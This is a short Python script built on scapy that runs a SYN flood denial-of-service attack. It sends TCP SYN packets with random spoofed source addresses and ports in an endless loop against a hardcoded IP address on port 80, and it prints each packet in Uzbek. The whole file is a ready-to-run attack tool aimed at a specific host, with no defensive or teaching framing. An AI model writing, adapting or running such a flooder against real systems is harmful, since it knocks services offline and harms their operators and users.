from scapy.all import *
import random

target_ip = "165.22.22.196"  
target_port = 80           

def syn_flood():
    while True:

        source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        source_port = random.randint(1024, 65535)  


        syn_packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")


        send(syn_packet, verbose=False)

        print(f"SYN jo‘natildi: {source_ip}:{source_port} -> {target_ip}:{target_port}")


syn_flood()
